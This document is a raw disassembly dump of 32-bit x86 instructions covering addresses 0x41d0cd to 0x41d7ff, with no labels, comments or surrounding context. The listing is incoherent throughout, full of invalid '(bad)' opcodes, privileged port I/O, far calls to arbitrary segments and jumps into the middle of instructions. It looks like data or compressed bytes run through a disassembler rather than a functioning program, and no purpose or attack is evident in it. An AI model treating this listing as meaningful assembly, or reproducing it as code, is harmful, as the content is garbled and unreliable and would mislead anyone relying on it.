  41d0cd:	ficomp DWORD PTR [ebp-0x36]
  41d0d0:	inc    esi
  41d0d1:	jmp    0x4212c277
  41d0d6:	mov    ecx,0xcc127da1
  41d0db:	jle    0x41d122
  41d0dd:	(bad)  [edx]
  41d0df:	add    BYTE PTR [ecx-0x26aa3aeb],al
  41d0e5:	mov    ebp,0x9b3cc540
  41d0ea:	cwde   
  41d0eb:	ins    BYTE PTR es:[edi],dx
  41d0ec:	cmp    ebx,DWORD PTR [ebp-0x4]
  41d0ef:	sbb    BYTE PTR [ecx-0x3db9e4ca],al
  41d0f5:	cmp    al,0xe8
  41d0f7:	je     0x41d15e
  41d0f9:	repz (bad) 
  41d0fb:	ds in  eax,0xbf
  41d0fe:	xorps  xmm2,XMMWORD PTR [ebp+0x3b9550c4]
  41d105:	pop    edx
  41d106:	add    al,0xfd
  41d108:	push   ds
  41d109:	lock stc 
  41d10b:	loope  0x41d144
  41d10d:	cwde   
  41d10e:	sub    ecx,DWORD PTR [edx+edx*1-0x2dbe0e31]
  41d115:	call   0xef60e286
  41d11a:	out    0x59,al
  41d11c:	mov    dh,bl
  41d11e:	inc    edi
  41d11f:	loopne 0x41d0bd
  41d121:	push   esi
  41d122:	inc    ebx
  41d123:	push   es
  41d124:	or     ch,0x7f
  41d127:	inc    eax
  41d128:	xor    DWORD PTR [edi+0x7af6f4f9],0x400e78ea
  41d132:	sbb    edi,DWORD PTR [edx]
  41d134:	mov    esp,0x460d9bcb
  41d139:	pop    es
  41d13a:	in     eax,0xc8
  41d13c:	pop    esp
  41d13d:	add    BYTE PTR [edi+0x2e],0x92
  41d141:	ret    
  41d142:	das    
  41d143:	ja     0x41d152
  41d145:	jmp    0x41d1ab
  41d147:	push   0x9822d62c
  41d14c:	ret    
  41d14d:	xor    eax,0xa9106758
  41d152:	lock sar BYTE PTR [ebp+ecx*2+0x73],0x35
  41d158:	pop    eax
  41d159:	in     al,0x33
  41d15b:	iret   
  41d15c:	jnp    0x41d10d
  41d15e:	cmp    al,0x4f
  41d160:	sub    eax,0xa788ee30
  41d165:	fsub   QWORD PTR [ebx+0x34]
  41d168:	ffree  st(4)
  41d16a:	ins    DWORD PTR es:[edi],dx
  41d16b:	(bad)  
  41d16c:	or     esp,DWORD PTR [ebx+0x9173df2]
  41d172:	xchg   ecx,eax
  41d173:	pop    esi
  41d174:	xchg   edx,eax
  41d175:	jo     0x41d1c1
  41d177:	adc    eax,0x9e9a03d8
  41d17c:	inc    ebx
  41d17d:	and    BYTE PTR [edx-0x73f794c3],cl
  41d183:	and    al,0x0
  41d185:	dec    eax
  41d186:	test   bl,ah
  41d188:	cwde   
  41d189:	pop    edi
  41d18a:	jne    0x41d181
  41d18c:	sub    al,0x29
  41d18e:	xlat   BYTE PTR ds:[ebx]
  41d18f:	sbb    ch,ah
  41d191:	jp     0x41d11f
  41d193:	lahf   
  41d194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d195:	xor    dl,0x11
  41d198:	ret    0xa975
  41d19b:	in     al,0x59
  41d19d:	xor    eax,edx
  41d19f:	scas   eax,DWORD PTR es:[edi]
  41d1a0:	in     eax,dx
  41d1a1:	inc    ebp
  41d1a2:	repnz iret 
  41d1a4:	sub    cl,bh
  41d1a6:	xor    al,0xcb
  41d1a8:	lods   al,BYTE PTR es:[esi]
  41d1aa:	fstp   DWORD PTR [edx-0x5e]
  41d1ad:	inc    edi
  41d1ae:	add    al,0x93
  41d1b0:	loope  0x41d15c
  41d1b2:	fwait
  41d1b3:	les    esp,FWORD PTR [ebp-0x25f1288f]
  41d1b9:	or     BYTE PTR [edx-0x23f31690],dh
  41d1bf:	jae    0x41d236
  41d1c1:	lea    esp,[edx+ebx*2]
  41d1c4:	xor    BYTE PTR [ecx-0xb967546],ah
  41d1ca:	adc    ebx,DWORD PTR [eax+0x570e31db]
  41d1d0:	xchg   DWORD PTR [edx+0x31fb12d],eax
  41d1d6:	inc    esi
  41d1d7:	adc    eax,0xa850e1b9
  41d1dc:	jne    0x41d254
  41d1de:	rol    DWORD PTR [ecx+ebx*2-0x5d28b3a],cl
  41d1e5:	xor    esi,ecx
  41d1e7:	popf   
  41d1e8:	inc    ebp
  41d1e9:	pop    ecx
  41d1ea:	aaa    
  41d1eb:	sar    BYTE PTR [esi],cl
  41d1ed:	sbb    DWORD PTR [ecx+edx*1+0x793123d2],0x3d54b129
  41d1f8:	mov    ebx,edi
  41d1fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1fb:	loopne 0x41d24e
  41d1fd:	and    esi,DWORD PTR [ebp+0x6c]
  41d200:	fdiv   QWORD PTR [esi-0xa]
  41d203:	jno    0x41d21f
  41d205:	jge    0x41d264
  41d207:	hlt    
  41d208:	and    eax,0x3365dd5a
  41d20d:	push   cs
  41d20e:	test   eax,0x86d5ffa9
  41d213:	inc    esi
  41d214:	es xchg ebp,eax
  41d216:	xlat   BYTE PTR ds:[ebx]
  41d217:	add    eax,0xc2ce66e2
  41d21c:	pop    esp
  41d21d:	ret    0x90f6
  41d220:	stc    
  41d221:	sti    
  41d222:	xor    ah,BYTE PTR fs:[edi+0x716cb391]
  41d229:	mov    al,ds:0x7886fe60
  41d22e:	outs   dx,DWORD PTR ds:[esi]
  41d22f:	ins    DWORD PTR es:[edi],dx
  41d230:	call   0x709e:0x466902f9
  41d237:	fadd   QWORD PTR [esi]
  41d239:	scas   eax,DWORD PTR es:[edi]
  41d23a:	rdtsc  
  41d23c:	aaa    
  41d23d:	sub    bl,BYTE PTR [eax-0x39]
  41d240:	adc    BYTE PTR [ebx+0x3c4be1a7],dl
  41d246:	lods   al,BYTE PTR ds:[esi]
  41d247:	or     bh,BYTE PTR [eax-0x16]
  41d24a:	imul   edi,ebp,0xd5925d
  41d250:	add    bl,BYTE PTR [esi-0x283b5579]
  41d256:	adc    eax,0xf91252b6
  41d25b:	test   DWORD PTR [ebx],esi
  41d25d:	jmp    0x41d225
  41d25f:	inc    edx
  41d260:	dec    ebp
  41d261:	pushw  0xffd3
  41d264:	sub    DWORD PTR [ebx+0x75],0xffffffb4
  41d268:	lock xor al,0xa2
  41d26b:	icebp  
  41d26c:	arpl   WORD PTR ds:0x4b0762e0,si
  41d272:	dec    eax
  41d273:	cmp    al,0xf6
  41d275:	sub    al,0xed
  41d277:	jnp    0x41d216
  41d279:	push   ss
  41d27a:	xchg   edi,eax
  41d27b:	stc    
  41d27c:	push   ebx
  41d27d:	loope  0x41d20a
  41d27f:	pop    edi
  41d280:	aaa    
  41d281:	ret    0x7c19
  41d284:	dec    esi
  41d285:	push   ecx
  41d286:	push   cs
  41d287:	out    0xcf,eax
  41d289:	dec    ebp
  41d28a:	in     eax,0x8e
  41d28c:	pop    ss
  41d28d:	stos   DWORD PTR es:[edi],eax
  41d28e:	(bad)  
  41d28f:	es (bad) 
  41d291:	jne    0x41d311
  41d293:	repnz mov ebp,0x6cafc305
  41d299:	adc    eax,0x74234e66
  41d29e:	mov    cl,0x80
  41d2a0:	lds    ecx,FWORD PTR [esi-0x69]
  41d2a3:	sub    al,0x5d
  41d2a5:	jmp    0x23a8:0x13f2b75d
  41d2ac:	in     eax,dx
  41d2ad:	jno    0x41d2a0
  41d2af:	cmp    al,BYTE PTR [eax]
  41d2b1:	outs   dx,DWORD PTR ds:[esi]
  41d2b2:	stos   DWORD PTR es:[edi],eax
  41d2b3:	and    cl,BYTE PTR [ebx-0x5e]
  41d2b6:	and    eax,0x8b14a650
  41d2bb:	xchg   edi,eax
  41d2bc:	push   edi
  41d2bd:	push   ecx
  41d2be:	aad    0xb5
  41d2c0:	xor    dl,BYTE PTR [eax]
  41d2c2:	adc    BYTE PTR [ecx+ecx*8+0x41],dh
  41d2c6:	aaa    
  41d2c7:	in     eax,0x9e
  41d2c9:	(bad)  
  41d2ca:	loopne 0x41d337
  41d2cc:	lods   al,BYTE PTR ds:[esi]
  41d2cd:	gs das 
  41d2cf:	push   ss
  41d2d0:	in     al,dx
  41d2d1:	inc    ebp
  41d2d2:	scas   eax,DWORD PTR es:[edi]
  41d2d3:	data16 fld QWORD PTR [edx]
  41d2d6:	neg    ecx
  41d2d8:	xchg   edi,eax
  41d2d9:	repz and DWORD PTR [esi],edi
  41d2dc:	es js  0x41d2aa
  41d2df:	ins    DWORD PTR es:[edi],dx
  41d2e0:	adc    al,0x2d
  41d2e2:	mov    eax,0xab41a04b
  41d2e7:	xchg   esp,eax
  41d2e8:	add    DWORD PTR [ebp-0x63f6ead4],ebp
  41d2ee:	mov    cl,0x4c
  41d2f0:	pop    ds
  41d2f1:	pusha  
  41d2f2:	push   ebp
  41d2f3:	push   eax
  41d2f4:	sbb    DWORD PTR [esi-0x6537a804],eax
  41d2fa:	fld    TBYTE PTR [eax+0x78]
  41d2fd:	push   ss
  41d2fe:	test   BYTE PTR [ecx],dl
  41d300:	cmp    dl,BYTE PTR [ebx-0x4c]
  41d303:	scas   al,BYTE PTR es:[edi]
  41d304:	call   0x9bd1:0x217af19a
  41d30b:	mov    ebx,DWORD PTR [eax]
  41d30d:	ret    0xd7d0
  41d310:	sbb    bh,BYTE PTR [edi+eax*4]
  41d313:	std    
  41d314:	call   FWORD PTR [esi-0x79eef154]
  41d31a:	test   DWORD PTR [edx-0x52],eax
  41d31d:	ficomp DWORD PTR [ebp-0x7c]
  41d320:	outs   dx,DWORD PTR ds:[esi]
  41d321:	pop    ebp
  41d322:	or     ecx,DWORD PTR ds:[ebx+eiz*2]
  41d326:	adc    dh,BYTE PTR [ecx+0x60]
  41d329:	(bad)
  41d32c:	push   ebx
  41d32d:	iret   
  41d32e:	push   esi
  41d32f:	add    ebx,DWORD PTR [ebp+0x33cf8c28]
  41d335:	sub    DWORD PTR [ecx+0x48866126],eax
  41d33b:	es push eax
  41d33d:	or     edi,ebx
  41d33f:	sbb    al,0xf3
  41d341:	inc    esp
  41d342:	inc    edx
  41d343:	in     ax,0x1c
  41d346:	dec    esp
  41d347:	cdq    
  41d348:	and    BYTE PTR [edi+0x4b],ah
  41d34b:	mov    ah,0xc9
  41d34d:	sub    BYTE PTR [ebp-0x7a],ch
  41d350:	push   esi
  41d351:	pusha  
  41d352:	and    al,cl
  41d354:	sbb    al,0x99
  41d356:	out    dx,al
  41d357:	add    edx,esp
  41d359:	pusha  
  41d35a:	mov    dl,dh
  41d35c:	sbb    al,0x4d
  41d35e:	dec    ebx
  41d35f:	aaa    
  41d360:	pop    esi
  41d361:	pop    ebp
  41d362:	or     esp,eax
  41d364:	call   0xf9fb:0x9630e206
  41d36b:	test   DWORD PTR [eax+0x0],ebp
  41d36e:	mov    BYTE PTR [ecx+0x3f],bl
  41d371:	xlat   BYTE PTR ds:[ebx]
  41d372:	pop    ds
  41d373:	and    DWORD PTR [ebp-0x67],eax
  41d376:	repnz push ds
  41d378:	stos   BYTE PTR es:[edi],al
  41d379:	aas    
  41d37a:	xchg   ebp,eax
  41d37b:	adc    ecx,DWORD PTR [ecx+ecx*8-0x14]
  41d37f:	bswap  edx
  41d381:	sbb    ah,BYTE PTR [ebp+0x56]
  41d384:	sbb    dh,BYTE PTR [ebx+edi*4-0x7c152e45]
  41d38b:	stos   DWORD PTR es:[edi],eax
  41d38c:	xlat   BYTE PTR ds:[ebx]
  41d38d:	stos   BYTE PTR es:[edi],al
  41d38e:	xchg   ebp,eax
  41d38f:	sar    cl,cl
  41d391:	mov    ah,0x7a
  41d393:	sbb    eax,0x3f8e9265
  41d398:	je     0x41d32a
  41d39a:	out    dx,eax
  41d39b:	inc    ebx
  41d39c:	mov    esp,ss
  41d39e:	mov    edx,0x36ae277b
  41d3a3:	jbe    0x41d375
  41d3a5:	dec    esp
  41d3a6:	loop   0x41d37b
  41d3a8:	mov    ebx,0xc6fb04fb
  41d3ad:	inc    ebx
  41d3ae:	call   0x396b:0xbb98a5f4
  41d3b5:	add    BYTE PTR [esi-0x64],al
  41d3b8:	int    0x24
  41d3ba:	stos   DWORD PTR es:[edi],eax
  41d3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3bc:	push   eax
  41d3bd:	jmp    0xc42e47d8
  41d3c2:	(bad)  
  41d3c3:	cmp    eax,0x38f1201c
  41d3c8:	test   al,0x90
  41d3ca:	(bad)  
  41d3cb:	stos   DWORD PTR es:[edi],eax
  41d3cc:	cmp    BYTE PTR [ebx],dl
  41d3ce:	data16 add BYTE PTR [eax],ch
  41d3d1:	aam    0x46
  41d3d3:	mov    al,ds:0xd6fb34c1
  41d3d8:	rcl    BYTE PTR [ecx+0x61],cl
  41d3db:	adc    ebp,DWORD PTR [ebp-0x1310a740]
  41d3e1:	jne    0x41d3dc
  41d3e3:	leave  
  41d3e4:	sbb    eax,0xba98d884
  41d3e9:	adc    cl,BYTE PTR ds:0xcbf78f7e
  41d3ef:	jmp    0xa658762c
  41d3f4:	neg    ebx
  41d3f6:	jbe    0x41d3bb
  41d3f8:	push   eax
  41d3f9:	mov    bl,0xfc
  41d3fb:	clc    
  41d3fc:	ja     0x41d3e4
  41d3fe:	xor    cl,ch
  41d400:	jmp    0x8501:0x77d94a34
  41d407:	adc    edx,DWORD PTR [ecx+0x31c0cbbd]
  41d40d:	or     cl,BYTE PTR [esi+0x77]
  41d410:	fild   WORD PTR [edx]
  41d412:	je     0x41d40b
  41d414:	out    0x9b,eax
  41d416:	jno    0x41d39c
  41d418:	leave  
  41d419:	mov    ch,0x1a
  41d41b:	out    0x26,al
  41d41d:	pop    edx
  41d41e:	sbb    al,0x59
  41d420:	iret   
  41d421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d422:	clc    
  41d423:	push   0x25
  41d425:	std    
  41d426:	sbb    al,0xea
  41d428:	adc    al,0xc
  41d42a:	aad    0x2
  41d42c:	je     0x41d459
  41d42e:	pop    ebp
  41d42f:	xchg   ebp,eax
  41d430:	push   cs
  41d431:	mov    ds:0x2deb423d,eax
  41d436:	ja     0x41d3e5
  41d438:	repnz lahf 
  41d43a:	mov    gs,WORD PTR [edx]
  41d43c:	dec    edi
  41d43d:	clc    
  41d43e:	xor    ebx,DWORD PTR [esi+edi*1]
  41d441:	push   esi
  41d442:	push   edx
  41d443:	xor    DWORD PTR [eax+0x5e],ebp
  41d446:	out    0x7c,al
  41d448:	dec    esp
  41d449:	cmp    DWORD PTR cs:[ebx],ebp
  41d44c:	xor    BYTE PTR [esi-0x3367fe8c],cl
  41d452:	scas   eax,DWORD PTR es:[edi]
  41d453:	mul    DWORD PTR [eax+0x2c]
  41d456:	stc    
  41d457:	push   es
  41d458:	outs   dx,DWORD PTR ds:[esi]
  41d459:	sti    
  41d45a:	stc    
  41d45b:	or     eax,DWORD PTR [esi+0x43f1f50e]
  41d461:	je     0x41d406
  41d463:	ret    0xcd8d
  41d466:	xchg   dh,cl
  41d468:	or     DWORD PTR [edx-0x1e],ebp
  41d46b:	aam    0xb
  41d46d:	mov    ebp,es
  41d46f:	scas   al,BYTE PTR es:[edi]
  41d470:	sbb    al,0x6
  41d472:	addr16 push ebp
  41d474:	sub    al,0x15
  41d476:	jg     0x41d3fc
  41d478:	mov    BYTE PTR [edx],bl
  41d47a:	fpatan 
  41d47c:	jle    0x41d409
  41d47e:	pop    eax
  41d47f:	(bad)  
  41d480:	icebp  
  41d481:	pop    esi
  41d482:	cs into 
  41d484:	pusha  
  41d485:	or     edx,DWORD PTR [edx-0x54]
  41d488:	scas   eax,DWORD PTR es:[edi]
  41d489:	stos   DWORD PTR es:[edi],eax
  41d48a:	xlat   BYTE PTR ds:[ebx]
  41d48b:	repz cmp DWORD PTR [ebp*4-0x548701b8],eax
  41d493:	mov    eax,0x9d237f7
  41d498:	scas   eax,DWORD PTR es:[edi]
  41d499:	sbb    dh,BYTE PTR [esp+ebx*2+0x214e2ad3]
  41d4a0:	cs mov bh,0xdb
  41d4a3:	jge    0x41d4a7
  41d4a5:	and    bh,BYTE PTR [edx+eiz*2-0x3c]
  41d4a9:	maxps  xmm5,XMMWORD PTR [eax+ebp*1]
  41d4ad:	mov    ds:0x96664e4a,eax
  41d4b2:	or     ah,BYTE PTR [edx-0x53]
  41d4b5:	mov    esi,0x981e96d8
  41d4ba:	std    
  41d4bb:	adc    al,BYTE PTR [edx]
  41d4bd:	pop    es
  41d4be:	mov    eax,0xa1ace97e
  41d4c3:	sti    
  41d4c4:	jae    0x41d51f
  41d4c6:	stos   DWORD PTR es:[edi],eax
  41d4c7:	lods   eax,DWORD PTR ds:[esi]
  41d4c8:	sub    DWORD PTR [eax+0x2],edi
  41d4cb:	pusha  
  41d4cc:	pop    eax
  41d4cd:	push   eax
  41d4ce:	cdq    
  41d4cf:	fsubp  st(7),st
  41d4d1:	push   edi
  41d4d2:	outs   dx,BYTE PTR ds:[esi]
  41d4d3:	sbb    esp,DWORD PTR [eax]
  41d4d5:	enter  0xb631,0x1e
  41d4d9:	ja     0x41d517
  41d4db:	jbe    0x41d4d7
  41d4dd:	sbb    esp,DWORD PTR [esi]
  41d4df:	xlat   BYTE PTR ds:[ebx]
  41d4e0:	add    eax,0xb289c849
  41d4e5:	test   al,0x57
  41d4e7:	sbb    BYTE PTR [esi+0x19],dl
  41d4ea:	nop
  41d4eb:	push   esi
  41d4ec:	cld    
  41d4ed:	mov    edx,0x9c94b6ed
  41d4f2:	loop   0x41d4b5
  41d4f4:	cmp    DWORD PTR [eax],esp
  41d4f6:	dec    edi
  41d4f7:	mov    edi,0xcb83cdb1
  41d4fc:	xchg   esi,eax
  41d4fd:	inc    edx
  41d4fe:	call   FWORD PTR [edi]
  41d500:	cmp    DWORD PTR [edx+0x3],0x1dca617a
  41d507:	sub    ebx,DWORD PTR [edi]
  41d509:	mov    ch,0x97
  41d50b:	sub    eax,0xb0754f5f
  41d510:	rol    BYTE PTR ds:0xafcc3e8f,0xf7
  41d517:	inc    eax
  41d518:	dec    eax
  41d519:	or     DWORD PTR [edx],eax
  41d51b:	jmp    0x41d503
  41d51d:	jnp    0x41d558
  41d51f:	dec    esp
  41d520:	sbb    al,dl
  41d522:	sbb    al,0x1f
  41d524:	sub    cl,BYTE PTR [ecx]
  41d526:	xchg   ebx,eax
  41d527:	and    al,0xa0
  41d529:	shl    BYTE PTR [edi],0x6c
  41d52c:	mov    cl,BYTE PTR ds:0x72106aea
  41d532:	adc    DWORD PTR [ecx-0x58],ebx
  41d535:	out    dx,al
  41d536:	fcmovnb st,st(1)
  41d538:	aam    0x24
  41d53a:	dec    esi
  41d53b:	xor    esp,DWORD PTR [edx]
  41d53d:	adc    bh,BYTE PTR [eax-0x12]
  41d540:	in     al,0x60
  41d542:	lds    ecx,FWORD PTR [ebx]
  41d544:	mov    ch,0x7d
  41d546:	dec    edx
  41d547:	adc    eax,0xe55e6ad7
  41d54c:	and    eax,0xba3b0296
  41d551:	in     eax,dx
  41d552:	fisub  DWORD PTR [eax+edx*2]
  41d555:	jl     0x41d550
  41d557:	pop    edx
  41d558:	iret   
  41d559:	je     0x41d55f
  41d55b:	cdq    
  41d55c:	je     0x41d594
  41d55e:	push   esp
  41d55f:	hlt    
  41d560:	sub    BYTE PTR [ebp+esi*8+0xda4216e],0x74
  41d568:	stos   BYTE PTR es:[edi],al
  41d569:	jne    0x41d5c8
  41d56b:	adc    ecx,edx
  41d56d:	popf   
  41d56e:	ss mov edi,0x14e9e37
  41d574:	xchg   esp,eax
  41d575:	repz out 0x88,al
  41d578:	xlat   BYTE PTR ds:[ebx]
  41d579:	and    al,0x68
  41d57c:	add    ebp,esp
  41d57e:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d580:	mov    ds:0x996b57d4,eax
  41d585:	outs   dx,BYTE PTR ds:[esi]
  41d586:	fild   QWORD PTR [edx*1+0x14514738]
  41d58d:	push   ds
  41d58e:	adc    al,BYTE PTR [bp+si]
  41d591:	outs   dx,DWORD PTR ds:[esi]
  41d592:	lods   eax,DWORD PTR ds:[esi]
  41d593:	push   eax
  41d594:	jg     0x41d5fd
  41d596:	hlt    
  41d597:	add    al,0x68
  41d599:	sbb    eax,0x33f5b5bc
  41d59e:	test   eax,0xc1363ab4
  41d5a3:	adc    eax,0xdb6d579b
  41d5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a9:	mov    bh,BYTE PTR [eax+edx*4]
  41d5ac:	cmc    
  41d5ad:	ds jl  0x41d5d8
  41d5b0:	sbb    BYTE PTR [ebx+0x1d],ch
  41d5b3:	jmp    FWORD PTR [edi]
  41d5b5:	stos   DWORD PTR es:[edi],eax
  41d5b6:	fdivr  DWORD PTR [ebx-0x39]
  41d5b9:	xchg   edx,eax
  41d5ba:	xchg   esi,eax
  41d5bb:	sbb    DWORD PTR [edx+0x7c03575e],esi
  41d5c1:	xchg   ecx,eax
  41d5c2:	xchg   ecx,eax
  41d5c3:	mov    dl,0x45
  41d5c5:	dec    edi
  41d5c6:	and    eax,0x766cfb7b
  41d5cb:	push   edx
  41d5cc:	int    0xaa
  41d5ce:	test   eax,0x80fd4499
  41d5d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5d4:	cmp    ebp,DWORD PTR [edi+0x3f]
  41d5d7:	xchg   esi,eax
  41d5d8:	or     ebp,DWORD PTR [ecx]
  41d5da:	sbb    eax,0x7df87544
  41d5df:	cmp    al,0x27
  41d5e1:	mov    al,0x68
  41d5e3:	test   DWORD PTR ds:0xc0bc42f7,esp
  41d5e9:	add    al,0x3d
  41d5eb:	push   esp
  41d5ec:	jo     0x41d609
  41d5ee:	jb     0x41d579
  41d5f0:	xor    eax,0xb8eaad68
  41d5f5:	outs   dx,DWORD PTR ds:[esi]
  41d5f6:	adc    eax,0xfe1e5975
  41d5fb:	jbe    0x41d580
  41d5fd:	in     al,0x88
  41d5ff:	rcl    BYTE PTR [ecx],cl
  41d601:	jle    0x41d675
  41d603:	push   edx
  41d604:	scas   al,BYTE PTR es:[edi]
  41d605:	jae    0x41d5c1
  41d607:	adc    DWORD PTR [esp+ecx*1+0x1cd2c0a4],ebp
  41d60e:	mov    ds:0x5b7c629,al
  41d613:	addr16 (bad) 
  41d615:	mov    bh,0x84
  41d617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d618:	sub    cl,BYTE PTR [edi+0x51be3c93]
  41d61e:	aas    
  41d61f:	test   DWORD PTR [eax-0x37f52182],ecx
  41d625:	xchg   ecx,eax
  41d626:	nop
  41d627:	call   0x7636:0x63cd0825
  41d62e:	rol    cl,cl
  41d630:	jne    0x41d5da
  41d632:	outs   dx,BYTE PTR ds:[esi]
  41d633:	pop    esi
  41d634:	cmp    al,0x58
  41d636:	dec    DWORD PTR [edx-0x15]
  41d639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d63a:	mov    ebp,0x20f0036c
  41d63f:	shr    DWORD PTR [edx],cl
  41d641:	jb     0x41d60b
  41d643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d644:	sub    eax,0x20aa1b02
  41d649:	out    0xcd,eax
  41d64b:	mov    esp,0xbfa6059f
  41d650:	ins    BYTE PTR es:[edi],dx
  41d651:	lock (bad) 
  41d654:	imul   esi,DWORD PTR [ecx],0x76
  41d657:	(bad)  
  41d658:	call   0x7403:0xf3776a69
  41d65f:	jnp    0x41d657
  41d661:	push   ecx
  41d662:	dec    esp
  41d663:	or     al,BYTE PTR [ecx+0x67a13544]
  41d669:	ret    0x5331
  41d66c:	aam    0xf0
  41d66e:	arpl   cx,cx
  41d670:	sbb    al,0xeb
  41d672:	jl     0x41d629
  41d674:	add    ebp,edi
  41d676:	in     eax,dx
  41d677:	lahf   
  41d678:	leave  
  41d679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67a:	mov    esp,0xf8350f48
  41d67f:	or     ch,BYTE PTR [esi-0x104399f9]
  41d685:	mov    eax,ds:0xa8aeb90f
  41d68a:	sub    edi,DWORD PTR [eax+0x6a]
  41d68d:	jmp    0x7bff:0xe4fd5bf8
  41d694:	in     al,0xc5
  41d696:	ficom  WORD PTR [eax]
  41d698:	and    edi,esp
  41d69a:	shl    DWORD PTR ds:0x6112a5cd,0x88
  41d6a1:	xchg   ebp,eax
  41d6a2:	fisubr DWORD PTR [edx-0x3012481]
  41d6a8:	sahf   
  41d6a9:	cmp    DWORD PTR [ebp-0x1c],0xe4897ff1
  41d6b0:	pop    eax
  41d6b1:	xor    bh,BYTE PTR [ebx+0x43]
  41d6b4:	test   BYTE PTR [ebx],cl
  41d6b6:	inc    edi
  41d6b7:	inc    esp
  41d6b8:	mov    edi,0xd663b432
  41d6bd:	nop
  41d6be:	in     eax,0xb
  41d6c0:	(bad)  
  41d6c1:	das    
  41d6c2:	or     DWORD PTR [ebx-0x6e],0x2c
  41d6c6:	mov    ch,0x29
  41d6c8:	mov    BYTE PTR [edx+eiz*2],ah
  41d6cb:	or     ebx,eax
  41d6cd:	pop    ebp
  41d6ce:	icebp  
  41d6cf:	sbb    dh,BYTE PTR [edi]
  41d6d1:	pop    esi
  41d6d2:	sbb    eax,DWORD PTR [edi]
  41d6d4:	call   0x5e00:0xc03655bb
  41d6db:	dec    esi
  41d6dc:	push   ebp
  41d6dd:	push   es
  41d6de:	and    cl,BYTE PTR [esi+0x7]
  41d6e1:	push   0xffffffc4
  41d6e3:	mov    esi,0x599a085c
  41d6e8:	inc    ecx
  41d6e9:	push   ebp
  41d6ea:	push   ebx
  41d6eb:	mov    ds:0xc04a881c,al
  41d6f0:	enter  0xe948,0x74
  41d6f4:	inc    edx
  41d6f5:	lods   al,BYTE PTR ds:[esi]
  41d6f6:	adc    ch,BYTE PTR [eax-0x497c3750]
  41d6fc:	jecxz  0x41d692
  41d6fe:	jb     0x41d6dd
  41d700:	out    dx,eax
  41d701:	push   ebx
  41d702:	inc    esi
  41d703:	adc    BYTE PTR [eax],cl
  41d705:	adc    bh,BYTE PTR [edx]
  41d707:	jle    0x41d704
  41d709:	xor    al,0xee
  41d70b:	cld    
  41d70c:	addr16 dec edi
  41d70e:	je     0x41d715
  41d710:	dec    ebp
  41d711:	sbb    DWORD PTR [edx-0x62871179],esp
  41d717:	or     BYTE PTR [edi+ebx*1],cl
  41d71a:	retf   0x852e
  41d71d:	and    DWORD PTR [edi-0x1fce580a],ebx
  41d723:	xlat   BYTE PTR ds:[ebx]
  41d724:	pop    ds
  41d725:	js     0x41d7a0
  41d727:	jnp    0x41d6bf
  41d729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d72a:	retf   0x633c
  41d72d:	or     BYTE PTR [ebx+0x35e0c0cf],al
  41d733:	xchg   ebx,eax
  41d734:	test   BYTE PTR [ebx-0x5222a1e6],bl
  41d73a:	aas    
  41d73b:	iret   
  41d73c:	hlt    
  41d73d:	or     eax,0xc45af34
  41d742:	imul   esi,DWORD PTR [ecx],0x7fe8289c
  41d748:	add    BYTE PTR [ecx],al
  41d74a:	push   0xffffffd8
  41d74c:	and    DWORD PTR [eax-0x5e],esi
  41d74f:	std    
  41d750:	pop    ebx
  41d751:	(bad)  
  41d752:	xchg   edi,eax
  41d753:	jl     0x41d77a
  41d755:	cmp    eax,0x5a257639
  41d75a:	ret    
  41d75b:	sub    edi,ebp
  41d75d:	loopne 0x41d7c1
  41d75f:	jns    0x41d715
  41d761:	add    al,0x5b
  41d763:	in     al,dx
  41d764:	sub    al,0x5b
  41d766:	mov    DWORD PTR [edx],edi
  41d768:	xchg   ebx,ebp
  41d76a:	jae    0x41d79f
  41d76c:	jmp    0x41d740
  41d76e:	push   es
  41d76f:	int    0x4a
  41d771:	popf   
  41d772:	prefetch (bad)
  41d773:	or     eax,0xe2a26fdf
  41d778:	xchg   ebp,eax
  41d779:	or     bh,al
  41d77b:	out    dx,al
  41d77c:	cmp    ebx,esi
  41d77e:	xchg   edx,eax
  41d77f:	lds    esp,FWORD PTR [edx-0x3bae8d35]
  41d785:	loop   0x41d73c
  41d787:	cs sbb eax,0x92defea2
  41d78d:	xchg   ecx,eax
  41d78e:	ror    ecx,cl
  41d790:	push   eax
  41d791:	dec    esp
  41d792:	fdiv   QWORD PTR [eax]
  41d794:	ret    0x9180
  41d797:	rcr    DWORD PTR [edx+0x7b217a3b],0xea
  41d79e:	lds    edx,FWORD PTR [ebp+0x48]
  41d7a1:	mov    esi,0x78c33129
  41d7a6:	dec    ecx
  41d7a7:	dec    esi
  41d7a8:	mov    al,ds:0x3447f631
  41d7ad:	lods   al,BYTE PTR ds:[esi]
  41d7ae:	aad    0xd4
  41d7b0:	fcomip st,st(6)
  41d7b2:	inc    esp
  41d7b3:	pop    ss
  41d7b4:	cld    
  41d7b5:	mov    esp,0x62f4d5d9
  41d7ba:	(bad)  
  41d7bb:	mov    edx,0xdd3bd19c
  41d7c0:	jle    0x41d79e
  41d7c2:	jg     0x41d782
  41d7c4:	gs sub eax,0x7d37037b
  41d7ca:	push   edi
  41d7cb:	js     0x41d7c7
  41d7cd:	ret    0x92d4
  41d7d0:	cwde   
  41d7d1:	stc    
  41d7d2:	aad    0xdb
  41d7d4:	pop    ds
  41d7d5:	in     al,0x61
  41d7d7:	or     BYTE PTR [edi+0x5be36dbd],dl
  41d7dd:	xor    BYTE PTR [ebp-0x7311d49e],ah
  41d7e3:	push   es
  41d7e4:	scas   eax,DWORD PTR es:[edi]
  41d7e5:	pop    ebx
  41d7e6:	or     BYTE PTR [esi],ah
  41d7e8:	fild   DWORD PTR [eax-0x19ec8ea4]
  41d7ee:	mov    edi,0x6a9f22ab
  41d7f3:	or     DWORD PTR [esi-0x3c],edi
  41d7f6:	rcl    DWORD PTR [esi+eiz*1],cl
  41d7f9:	or     ebx,edi
  41d7fb:	fs test al,0xf9
  41d7fe:	xchg   esi,eax
  41d7ff:	pusha  
